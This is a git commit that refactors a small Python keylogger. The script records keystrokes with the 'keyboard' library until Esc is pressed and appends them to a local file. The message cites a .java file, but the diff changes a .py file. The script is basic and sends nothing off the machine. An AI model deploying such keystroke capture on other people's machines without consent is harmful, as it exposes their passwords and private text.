befd4e11fe30ccc43f870efe8e8f9f47d05b86d1
Kiran B <kiwi2mii@gmail.com>
2022-08-11 10:34:49 +0200

    Update KeyLogger.java
    - Changed if statements to switch statement
    - Removed case 'left shift' because it's identical to case 'shift' AFAIK and therefore redundant
    - Removed case 'esc' because it's redundant (the program terminates once 'esc' is pressed, so what's the point of having it continue? Seems contradictory)
    - Changed 'escape' to 'esc' since they're synonymous AFAIK
    - Closed file

--- KeyLogger.py
+++ KeyLogger.py
@@ -1,19 +1,21 @@
 import keyboard
 
-
 def main():
-    keys_pressed = keyboard.record(until='escape')
+    keys_pressed = keyboard.record(until='esc')
     file = open("data.txt", 'a')
     # print(keys_pressed)
     for event in keys_pressed:
         if event.event_type == 'down':
-            if event.name == 'space':
-                file.write(" ")
-            elif event.name == 'right shift' or event.name == 'left shift' or event.name == 'shift' or event.name == 'esc':
-                continue
-            else:
-                file.write(event.name)
-
+            match event.name:
+                case 'space':
+                    file.write(" ")
+                case 'right shift':
+                    continue
+                case 'shift':
+                    continue
+                case _:
+                    file.write(event.name)
+    file.close()
 
 if __name__ == "__main__":
     main()
